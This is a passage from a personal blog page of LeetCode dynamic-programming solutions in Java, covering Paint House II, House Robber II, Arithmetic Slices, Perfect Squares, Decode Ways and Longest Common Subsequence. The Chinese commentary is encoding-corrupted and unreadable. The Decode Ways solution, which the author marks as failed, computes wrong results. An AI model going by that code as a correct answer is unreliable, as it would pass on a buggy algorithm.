class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; k; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>; m &lt; k; ++m) &#123;</span><br><span class="line">                <span class="keyword">if</span> (m != j) &#123;</span><br><span class="line">                    dp[i][m] = Math.min(dp[i][m], dp[i - <span class="number">1</span>][j] + costs[i-<span class="number">1</span>][m] );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        result = Math.min(result, dp[n][i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶å®è¿™æ˜¯å¯ä»¥ä¼˜åŒ–çš„ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ç¬¬ i - 1 ä¸ªä½ç½®çš„çŠ¶æ€ä¸­æ‰¾åˆ°æœ€å°å€¼å’Œæ¬¡å°å€¼ï¼Œåœ¨é€‰æ‹©ç¬¬ i ä¸ªæˆ¿å­çš„é¢œè‰²çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹å½“å‰é¢œè‰²æ˜¯ä¸æ˜¯å’Œæœ€å°å€¼çš„é¢œè‰²ç›¸é‡ï¼Œä¸æ˜¯çš„è¯ç›´æ¥åŠ ä¸Šæœ€å°å€¼ï¼Œå¦‚æœç›¸é‡çš„è¯ï¼Œæˆ‘ä»¬å°±åŠ ä¸Šæ¬¡å°å€¼ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬æŠŠä¸¤ä¸ªåµŒå¥—çš„å¾ªç¯ï¼Œæ‹†å¼€æˆä¸¤ä¸ªå¹³è¡Œçš„å¾ªç¯ï¼Œæ—¶é—´å¤æ‚åº¦é™è‡³ O(n*k)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">minCostII2</span><span class="params">(<span class="type">int</span>[][] costs)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (costs.length == <span class="number">0</span> || costs[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> costs.length, k = costs[<span class="number">0</span>].length;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n][k];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        Arrays.fill(dp[i], Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = costs[<span class="number">0</span>][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="comment">// min1 è¡¨ç¤ºçš„æ˜¯æœ€å°å€¼ï¼Œmin2 è¡¨ç¤ºçš„æ˜¯æ¬¡å°å€¼</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">min1</span> <span class="operator">=</span> Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>; l &lt; k; ++l) &#123;</span><br><span class="line">            <span class="keyword">if</span> (min1 &gt; dp[i - <span class="number">1</span>][l]) &#123;</span><br><span class="line">                min2 = min1;</span><br><span class="line">                min1 = dp[i - <span class="number">1</span>][l];</span><br><span class="line">                minIndex = l;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (min2 &gt; dp[i - <span class="number">1</span>][l]) &#123;</span><br><span class="line">                min2 = dp[i - <span class="number">1</span>][l];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; k; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (minIndex != j) &#123;</span><br><span class="line">                dp[i][j] = Math.min(dp[i][j], min1 + costs[i][j]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = Math.min(dp[i][j], min2 + costs[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">        result = Math.min(result, dp[n - <span class="number">1</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="213-house-robber-ii">213. House Robber II âˆš</span></h2><p>You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed. All houses at this place are <strong>arranged in a circle.</strong> That means the first house is the neighbor of the last one. Meanwhile, adjacent houses have security system connected and <strong>it will automatically contact the police if two adjacent houses were broken into on the same night</strong>.</p><p>Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight <strong>without alerting the police</strong>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,3,2]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: You cannot rob house 1 (money = 2) and then rob house 3 (money = 2),</span><br><span class="line">             because they are adjacent houses.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(nums==<span class="literal">null</span>||nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> Math.max(rob(nums,<span class="number">0</span>,len-<span class="number">2</span>),rob(nums,<span class="number">1</span>,len-<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lo==hi) <span class="keyword">return</span> nums[lo];</span><br><span class="line">    <span class="type">int</span> dp[]=<span class="keyword">new</span> <span class="title class_">int</span>[hi-lo+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=nums[lo];</span><br><span class="line">    dp[<span class="number">1</span>]=Math.max(nums[lo],nums[lo+<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=lo+<span class="number">2</span>;i&lt;=hi;i++)&#123;</span><br><span class="line">        dp[i-lo]=Math.max(dp[i-<span class="number">1</span>-lo],dp[i-<span class="number">2</span>-lo]+nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[hi-lo];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="413-arithmetic-slices">413. Arithmetic Slices âˆš</span></h2><p>A sequence of number is called arithmetic if it consists of at least three elements and if the difference between any two consecutive elements is the same.</p><p>For example, these are arithmetic sequence:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1, 3, 5, 7, 9</span><br><span class="line">7, 7, 7, 7</span><br><span class="line">3, -1, -5, -9</span><br></pre></td></tr></table></figure><p>The following sequence is not arithmetic.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1, 1, 2, 5, 7</span><br></pre></td></tr></table></figure><p>A zero-indexed array A consisting of N numbers is given. A slice of that array is any pair of integers (P, Q) such that 0 &lt;&#x3D; P &lt; Q &lt; N.</p><p>A slice (P, Q) of array A is called arithmetic if the sequence:<br>A[P], A[p + 1], â€¦, A[Q - 1], A[Q] is arithmetic. In particular, this means that P + 1 &lt; Q.</p><p>The function should return the number of arithmetic slices in the array A.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A = [1, 2, 3, 4]</span><br><span class="line"></span><br><span class="line">return: 3, for 3 arithmetic slices in A: [1, 2, 3], [2, 3, 4] and [1, 2, 3, 4] itself.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numberOfArithmeticSlices</span><span class="params">(<span class="type">int</span>[] A)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(A==<span class="literal">null</span>||A.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[A.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;A.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i]-A[i-<span class="number">1</span>]==A[i-<span class="number">1</span>]-A[i-<span class="number">2</span>])&#123;</span><br><span class="line">                dp[i]=dp[i-<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:dp) res+=i;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="279-perfect-squares">279. Perfect Squares âˆš</span></h2><p>Given a positive integer <em>n</em>, find the least number of perfect square numbers (for example, <code>1, 4, 9, 16, ...</code>) which sum to <em>n</em>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 12</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: 12 = 4 + 4 + 4.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 13</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 13 = 4 + 9.</span><br></pre></td></tr></table></figure><p>è´ªå¿ƒå¤±è´¥ æ¯”å¦‚è¯´12</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numSquares</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; squareList = list(n);</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        dp[i] = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> square : squareList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (square &gt; i) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = Math.min(dp[i], dp[i - square] + <span class="number">1</span>);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">list</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">         ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">         <span class="type">int</span> i=<span class="number">1</span>,num=<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">            res.add(num);</span><br><span class="line">             i++;</span><br><span class="line">             num=i*i;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="91-decode-ways">91. Decode Ways Ã—</span></h2><p>A message containing letters from <code>A-Z</code> is being encoded to numbers using the following mapping:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27; -&gt; 1</span><br><span class="line">&#x27;B&#x27; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&#x27;Z&#x27; -&gt; 26</span><br></pre></td></tr></table></figure><p>Given a <strong>non-empty</strong> string containing only digits, determine the total number of ways to decode it.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;12&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: It could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12).</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;226&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: It could be decoded as &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), or &quot;BBF&quot; (2 2 6).</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numDecodings</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;       </span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = s.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">one</span> <span class="operator">=</span> Integer.valueOf(s.substring(i-<span class="number">1</span>,i));</span><br><span class="line">            <span class="keyword">if</span>(one!=<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i]+=dp[i-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> two=Integer.valueOf(s.substring(i-<span class="number">2</span>,i));</span><br><span class="line">            <span class="keyword">if</span> (two &lt;= <span class="number">26</span>&amp;&amp;two&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                dp[i] = dp[i - <span class="number">2</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="åŒåºåˆ—ç±»åŠ¨æ€è§„åˆ’å­—ç¬¦åŒ¹é…ç±»">åŒåºåˆ—ç±»åŠ¨æ€è§„åˆ’ï¼šå­—ç¬¦åŒ¹é…ç±»</span></h1><p>å®ƒçš„é¢˜ç›®ç‰¹å¾å…¶å®ç‰¹åˆ«æ˜æ˜¾ï¼Œæ¯”å¦‚ï¼š</p><p>Â·  è¾“å…¥æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé—®æ˜¯å¦é€šè¿‡ä¸€å®šçš„è§„åˆ™ç›¸åŒ¹é…</p><p>Â·  è¾“å…¥æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé—®ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨åŒ…å«è¢«åŒ…å«çš„å…³ç³»</p><p>Â·  è¾“å…¥æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé—®ä¸€ä¸ªå­—ç¬¦ä¸²æ€æ ·é€šè¿‡ä¸€å®šè§„åˆ™è½¬æ¢æˆå¦ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>Â·  è¾“å…¥æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé—®å®ƒä»¬çš„å…±æœ‰éƒ¨åˆ†</p><p>å¯ä»¥ç”»è¡¨æ ¼æ¥è§£é¢˜</p><h2><span id="1143-longest-common-subsequence-">1143. Longest Common Subsequence -</span></h2><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² <code>text1</code> å’Œ <code>text2</code>ï¼Œè¿”å›è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å­åºåˆ—ã€‚</p><p>ä¸€ä¸ªå­—ç¬¦ä¸²çš„ <em>å­åºåˆ—</em> æ˜¯æŒ‡è¿™æ ·ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼šå®ƒæ˜¯ç”±åŸå­—ç¬¦ä¸²åœ¨ä¸æ”¹å˜å­—ç¬¦çš„ç›¸å¯¹é¡ºåºçš„æƒ…å†µä¸‹åˆ é™¤æŸäº›å­—ç¬¦ï¼ˆä¹Ÿå¯ä»¥ä¸åˆ é™¤ä»»ä½•å­—ç¬¦ï¼‰åç»„æˆçš„æ–°å­—ç¬¦ä¸²ã€‚<br> ä¾‹å¦‚ï¼Œâ€aceâ€ æ˜¯ â€œabcdeâ€ çš„å­åºåˆ—ï¼Œä½† â€œaecâ€ ä¸æ˜¯ â€œabcdeâ€ çš„å­åºåˆ—ã€‚ä¸¤ä¸ªå­—ç¬¦ä¸²çš„ã€Œå…¬å…±å­åºåˆ—ã€æ˜¯è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²æ‰€å…±åŒæ‹¥æœ‰çš„å­åºåˆ—ã€‚</p><p>è‹¥è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²æ²¡æœ‰å…¬å…±å­åºåˆ—ï¼Œåˆ™è¿”å› 0ã€‚</p><p><strong>ç¤ºä¾‹</strong> <strong>1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼štext1 = &quot;abcde&quot;, text2 = &quot;ace&quot; </span><br><span class="line">è¾“å‡ºï¼š3  </span><br><span class="line">è§£é‡Šï¼šæœ€é•¿å…¬å…±å­åºåˆ—æ˜¯ &quot;ace&quot;ï¼Œå®ƒçš„é•¿åº¦ä¸º 3ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹</strong> <strong>2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼štext1 = &quot;abc&quot;, text2 = &quot;abc&quot;</span><br><span class="line">è¾“å‡ºï¼š3</span><br><span class="line">è§£é‡Šï¼šæœ€é•¿å…¬å…±å­åºåˆ—æ˜¯ &quot;abc&quot;ï¼Œå®ƒçš„é•¿åº¦ä¸º 3ã€‚</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹</strong> <strong>3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼štext1 = &quot;abc&quot;, text2 = &quot;def&quot;</span><br><span class="line">è¾“å‡ºï¼š0</span><br><span class="line">è§£é‡Šï¼šä¸¤ä¸ªå­—ç¬¦ä¸²æ²¡æœ‰å…¬å…±å­åºåˆ—ï¼Œè¿”å› 0ã€‚</span><br></pre></td></tr></table></figure><p>  ç”»å›¾å¯å¾—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0             å¦‚æœå…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ç©ºä¸²</span><br><span class="line">b   0             é‚£ä¹ˆä¸¤ä¸ªå­—ç¬¦ä¸å­˜åœ¨å…¬å…±å­åºåˆ—</span><br><span class="line">c   0             å¯¹åº”çš„å­é—®é¢˜çŠ¶æ€åˆå§‹åŒ–ä¸º 0</span><br><span class="line">d   0</span><br><span class="line">e   0</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    text1 = &quot;a&quot;  text2 = &quot;a&quot; || text2 = &quot;ac&quot; || text2 = &quot;ace&quot;</span><br><span class="line">b   0             è€ƒè™‘å½“å‰çŠ¶æ€ dp[i][j] çš„æ—¶å€™        </span><br><span class="line">c   0             æˆ‘ä»¬å¯ä»¥è€ƒè™‘å­çŠ¶æ€ dp[i - 1][j - 1]</span><br><span class="line">d   0                             dp[i][j - 1]</span><br><span class="line">e   0                             dp[i - 1][j]</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1    text1 = &quot;ab&quot;  text2 = &quot;a&quot; || text2 = &quot;ac&quot; || text2 = &quot;ace&quot;</span><br><span class="line">c   0</span><br><span class="line">d   0</span><br><span class="line">e   0</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1</span><br><span class="line">c   0  1  2  2    text1 = &quot;abc&quot;  text2 = &quot;a&quot; || text2 = &quot;ac&quot; || text2 = &quot;ace&quot;</span><br><span class="line">d   0             ç”»åˆ°è¿™é‡Œï¼Œä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰å‘ç°å½“å½“å‰çš„å­—ç¬¦ä¸ç›¸åŒæ—¶</span><br><span class="line">e   0                 dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1])</span><br><span class="line">  &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1</span><br><span class="line">c   0  1  2  2</span><br><span class="line">d   0  1  2  2    text1 = &quot;abcd&quot;  text2 = &quot;a&quot; || text2 = &quot;ac&quot; || text2 = &quot;ace&quot;</span><br><span class="line">e   0</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1</span><br><span class="line">c   0  1  2  2</span><br><span class="line">d   0  1  2  2    </span><br><span class="line">e   0  1  2  3    text1 = &quot;abcde&quot;  text2 = &quot;a&quot; || text2 = &quot;ac&quot; || text2 = &quot;ace&quot;</span><br><span class="line"></span><br><span class="line">3 å°±æ˜¯æˆ‘ä»¬è¦è¿”å›çš„ç­”æ¡ˆ</span><br></pre></td></tr></table></figure><p>åœ¨æ‹†è§£é—®é¢˜ä¸­ä¹Ÿè¯´äº†ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œå°±æ˜¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœ str1(i) != str2(j):</span><br><span class="line">dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1])</span><br><span class="line"></span><br><span class="line">å¦‚æœ str1(i) == str2(j):</span><br><span class="line">dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1], dp[i - 1][j 